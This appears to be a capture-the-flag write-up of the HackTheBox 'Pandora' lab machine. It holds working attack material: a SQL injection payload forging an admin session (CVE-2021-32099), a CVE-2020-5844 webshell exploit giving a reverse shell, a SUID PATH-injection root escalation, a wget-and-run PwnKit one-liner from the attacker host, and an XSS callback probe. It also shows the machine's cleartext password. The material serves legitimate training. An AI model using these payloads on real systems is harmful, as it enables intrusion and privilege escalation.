---
render_with_liquid: false
title: HackTheBox Writeup  Pandora
date: 2023-12-19 15:03 +1400
tags: [hackthebox, nmap, linux, snmp, feroxbuster, onesixtyone, snmp-check, snmpbulkwalk, credentials-exposure, password-reuse, port-forwarding, pandorafms, cve-2021-32099, sqli, mysql, deserialization, cve-2020-5844, file-upload, suid, path-injection, oscp-like-2023]
---



Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user `daniel`. Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called `matt` is achieved by chaining SQL injection &amp;amp;amp;amp; RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user `root` is performed by exploiting a SUID binary for PATH variable injection.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ pt init '10.129.57.183 panda.htb'
+---------+--------+---------------+-----------+
| PROFILE | STATUS |      IP       |  DOMAIN   |
+---------+--------+---------------+-----------+
| pandora | on     | 10.129.57.183 | panda.htb |
+---------+--------+---------------+-----------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Dec 19 15:02:22 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 10.129.57.183
Nmap scan report for 10.129.57.183
Host is up, received user-set (0.25s latency).
Scanned at 2023-12-19 15:02:22 CST for 21s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Dec 19 15:02:43 2023 -- 1 IP address (1 host up) scanned in 21.36 seconds
```

**UDP**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ sudo nmap -sU -Pn -p- --min-rate 10000 -oA nmap/all_udp_ports -vv $(pt get rhost)
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-19 15:03 CST
Warning: 10.129.57.183 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.57.183
Host is up (0.28s latency).
Not shown: 65454 open|filtered udp ports (no-response), 80 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 75.40 seconds
```

## 80 - Site : Play | Landing


### Info

![](/assets/obsidian/2e6b96803c2403979dfa98bd245d13e7.png)

### Directory

```bash
feroxbuster -t 150 -o ferox_80.txt -k -u 'http://panda.htb/'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ cat ferox_80.txt | grep -vE 'http://panda.htb/assets/'
200      GET      907l     2081w    33560c http://panda.htb/index.html
200      GET      907l     2081w    33560c http://panda.htb/
200      GET      907l     2081w    33560c http://panda.htb/index.html
MSG      0.000 feroxbuster::heuristics detected directory listing: http://panda.htb/assets (Apache)
200      GET      907l     2081w    33560c http://panda.htb/
```

# User Flag
---

## Enumeration

After getting `panda.htb` domain from port 80, I've checked vhost, page sources, javascripts, nothing interesting found

### SNMP

Brute force community strings

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ onesixtyone 10.129.57.183 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
Scanning 1 hosts, 3218 communities
10.129.57.183 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.129.57.183 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
```

there's only `public`, query for the community data

It has information such as `System information`, `Installed Software`, `Processes`, `listening ports`, `Device Information`

```bash
snmp-check -w 10.129.57.183 | tee snmp-check.txt
```

Check hidden messages

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ snmpwalk -v2c -c public 10.129.57.183 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull = No Such Instance currently exists at this OID
```

> When **snmp-check** doesn't return enough data, use **snmpbulkwalk**
> 
> > Remember to install snmp-mibs-downloader before running **snmpwalk** to translate OID
> 
> ```bash
> sudo apt-get install snmp-mibs-downloader
> sudo sed -i 's/mibs :/#mibs :/g' /etc/snmp/snmp.conf
> ```
> Use `-Cr1000` to specify threads
> ```bash
> snmpbulkwalk -Cr1000 -c public -v2c 10.129.57.183 . | tee snmpbulkwalk.txt
> ```
{: .prompt-info }


## Shell as daniel


### Credential in process arguments

`daniel`'s password for the program `/usr/bin/host_check` revealed in process list

![](/assets/obsidian/483a45bbb27e2923aacab6bab1d2ade7.png)

### SSH

Password reuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ cssh daniel@panda.htb 'HotelBabylon23'
Warning: Permanently added 'panda.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 19 Dec 10:11:11 UTC 2023

  System load:           0.0
  Usage of /:            65.3% of 4.87GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             229
  Users logged in:       1
  IPv4 address for eth0: 10.129.57.183
  IPv6 address for eth0: dead:beef::250:56ff:feb9:adad

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Dec 19 10:00:11 2023 from 10.10.16.30
daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
```

## From daniel to matt


### Enumeration

There's a directory `pandora` in `/var/html`

```bash
daniel@pandora:/var/www$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Dec  7  2021 .
drwxr-xr-x 14 root root 4096 Dec  7  2021 ..
drwxr-xr-x  3 root root 4096 Dec  7  2021 html
drwxr-xr-x  3 matt matt 4096 Dec  7  2021 pandora
```

By checking nginx config, we know the webapp runs as `matt` and the vhost is `pandora.panda.htb`

```bash
daniel@pandora:/var/www$ cat /etc/apache2/sites-enabled/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

Since it's opened to `localhost` only (`<VirtualHost localhost:80>`), I'll need to port forward later

```bash
daniel@pandora:/var/www/pandora$ ls -la
total 16
drwxr-xr-x  3 matt matt 4096 Dec  7  2021 .
drwxr-xr-x  4 root root 4096 Dec  7  2021 ..
-rw-r--r--  1 matt matt   63 Jun 11  2021 index.html
drwxr-xr-x 16 matt matt 4096 Dec  7  2021 pandora_console
```

From `Dockerfile`, I know it's using `Pandora FMS`

```bash
daniel@pandora:/var/www/pandora/pandora_console$ cat Dockerfile
[...]

#Clone the repo
RUN git clone -b develop https://github.com/pandorafms/pandorafms.git /tmp/pandorafms
[...]
```

The directory was not writeable by daniel, so we can't write webshells

```bash
daniel@pandora:/var/www/pandora$ find . -writable
```

### Port forward for Pandora FMS

Forward port `80` on remote to port `81` on local

```bash
cssh daniel@panda.htb 'HotelBabylon23' -L 81:127.0.0.1:80
```

Point `pandora.panda.htb` to localhost

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ echo '127.0.0.1 pandora.panda.htb' | sudo tee -a /etc/hosts
127.0.0.1 pandora.panda.htb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ curl pandora.panda.htb:81
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```

### Exploit chain for Pandora FMS v7.0NG.742

By visiting the site, we get version info : `v7.0NG.742_FIX_PERL2020`

![](/assets/obsidian/724bfd7c43df31e1e0eceaab57e6f979.png)

Google : `pandorafms v7.0NG.742_FIX_PERL2020 exploit`

> https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/

- **CVE-2021-32099**
	- `/pandora_console/include/chart_generator.php?session_id=x` has **unauthenticated** Blind SQLI
- **CVE-2020-5844**
	- `index.php?sec=godmode/extensions&sec2=extensions/files_repo` in Pandora FMS v7.0 NG allows **authenticated** administrators to upload malicious PHP scripts

### Failed to login with admin credential from SQL dump

```bash
daniel@pandora:/var/www/pandora/pandora_console$ vi pandoradb_data.sql
```

![](/assets/obsidian/e3ab2d89199995eda1546045e5873c91.png)

```bash
hashcat loot/pandorafms_tusuario.hash /opt/wordlists/rockyou.txt -m 0
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ hashcat loot/pandorafms_tusuario.hash /opt/wordlists/rockyou.txt -m 0 --show
1da7ee7d45b96d0e1f45ee4ee23da560:pandora
```

### Unauthenticated SQL Injection (CVE-2021-32099)


#### Info

> https://github.com/ibnuuby/CVE-2021-32099

Vulnerable source codes:

> `/var/www/pandora/pandora_console/include/chart_generator.php`

SQLI

```php
[...]
// Try to initialize session using existing php session id.
$user = new PandoraFMS\User(['phpsessionid' => $_REQUEST['session_id']]);
if (check_login(false) === false) {
    // Error handler.
    ?>
[...]
```

> `/var/www/pandora/pandora_console/include/lib/User.php`

Unsafe object deserialize

```php
[...]
// Begin.
namespace PandoraFMS;

/**
 * Object user.
 */
class User
{
[...]
    public function __construct($data)
    {
        global $config;
[...]
```

#### Session as admin

URI : `http://pandora.panda.htb:81/pandora_console/include/chart_generator.php?session_id=`

This payload will retrieve data from `tsessions_php` table and fake the `data` column with serialized `User` object to impersonate my PHP session to `admin`

```
a' UNION SELECT 1,2,'id_usuario|s:5:"admin";'-- -
```

- `5` : Character count of `admin`
- `s` : String

![](/assets/obsidian/c9842827b095ea5d09d974e8095678ab.png)

Visit `http://pandora.panda.htb:81/pandora_console/` again, we have a session as admin

![](/assets/obsidian/8236c3a2023233497bb095d547309426.png)

### Pandora FMS RCE (Authenticated) (CVE-2020-5844)


#### Info

> https://github.com/UNICORDev/exploit-CVE-2020-5844

It uploads a webshell from `/pandora_console/index.php` with 2 params

![](/assets/obsidian/61bb8a2789d436d0a298b236e87b2973.png)

![](/assets/obsidian/134909abbba5e519973690197f251cde.png)

Lastly, the webshell will be saved to `/pandora_console/images/unicord.php`

#### Get reverse shell

```bash
git clone https://github.com/UNICORDev/exploit-CVE-2020-5844
cd exploit-CVE-2020-5844
```

Get `PHPSESSID` from cookies

![](/assets/obsidian/8ed2531ec1c2e694d09bf1ca52212c78.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora/exploit/exploit-CVE-2020-5844]
└─$ python3 exploit-CVE-2020-5844.py -t pandora.panda.htb 81 -p 2h570m70r37ko9sn96da42ppob -s 10.10.16.30 1111
```

![](/assets/obsidian/cec7afd0b1273b5eda78f152b03f0fc6.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora/exploit/exploit-CVE-2020-5844]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.57.183] 40512
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
$ cat /home/matt/user.txt
2a34aa9c0262089f618fd4e4a3c916db
```

# Root Flag
---

## From matt to root


### Get a better shell with ssh

I encountered error running `sudo -l`, it may be setuid config issue with **apache**

```bash
$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

Generate SSH keys for `matt`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ ssh-keygen -f matt
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in matt
Your public key has been saved in matt.pub
The key fingerprint is:
SHA256:mgVJilGcZYF/fZq4euvj5UuXQWvzHqGzhaXDqqDYIRU bravosec@fsociety
The key's randomart image is:
+---[RSA 3072]----+
|  .o.+=.         |
|   o++ .         |
|  . E.o  .  .    |
|     .... ....   |
|    .  .S. += o  |
|   .   +. oo X . |
|  . . +  .o X +  |
|   + o .++ o * . |
|  . o .==++.. .  |
+----[SHA256]-----+
```

Write the public key (`matt.pub`)

```bash
$ HOME=/home/matt mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQ...' > ~/.ssh/authorized_keys
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ ssh matt@panda.htb -i matt
[...]
matt@pandora:~$ sudo -l
[sudo] password for matt:
```

### SUID - Path Injection

`/usr/bin/pandora_backup` has SUID bits set with root, only `matt` and `root` are able to execute it

```bash
matt@pandora:~$ find / -type f -perm -4000 -ls 2>/dev/null
   264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
   265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec
   267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
   262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
   267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
   264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
   267390     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
   264371     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
   264643     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
   264040     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
   264219     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
   267387     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh
   262815    464 -rwsr-xr-x   1 root     root       473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
   264920     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   264927     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   266611     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
```

```bash
matt@pandora:~$ file /usr/bin/pandora_backup
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
```

`strings` was not installed on the machine, download the binary to our host

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ scp -i matt matt@panda.htb:/usr/bin/pandora_backup loot/pandora_backup
```

It executes `tar` without specifying the full path

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pandora]
└─$ strings loot/pandora_backup
/lib64/ld-linux-x86-64.so.2
puts
setreuid
system
getuid
geteuid
[...]
[]A\A]A^A_
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
Backup successful!
Terminating program!
[...]
```

We can inject the PATH for `tar`

```bash
matt@pandora:~$ cd /tmp
matt@pandora:/tmp$ echo '/bin/bash -p' > tar
matt@pandora:/tmp$ chmod +x ./tar
matt@pandora:/tmp$ export PATH=/tmp:$PATH
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp# id
uid=0(root) gid=1000(matt) groups=1000(matt)
root@pandora:/tmp# cat /root/root.txt
d51523f62cab080a12f952111be927cc
```

# Additional
---

## Privesc with Pwnkit

As soon as I saw `/usr/bin/pkexec` pop up with SUID, I'll try **pwnkit**

```bash
matt@pandora:~$ wget 10.10.16.30/PwnKit.py -O /dev/shm/pk && python3 /dev/shm/pk
--2023-12-19 19:33:07--  http://10.10.16.30/PwnKit.py
Connecting to 10.10.16.30:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 (3.2K) [text/x-python]
Saving to: ‘/dev/shm/pk’

/dev/shm/pk                                          100%[===================================================================================================================>]   3.19K  --.-KB/s    in 0s

2023-12-19 19:33:07 (16.9 MB/s) - ‘/dev/shm/pk’ saved [3262/3262]

[+] Creating shared library for exploit code.
[+] Calling execve()

# id
uid=0(root) gid=1000(matt) groups=1000(matt)
```

## Failed attempts


### Test XSS In contact form

> http://panda.htb/

```bash
nc -lvnp 80
```

```
<img src="http://10.10.16.30/x"/><a href="http://10.10.16.30/y">Test</a>
```

- `img` to check if anyone visits the page
- `a` to check if anyone clicked the link

![](/assets/obsidian/d8197ca03f4fdac9d26ed995b7ed580f.png)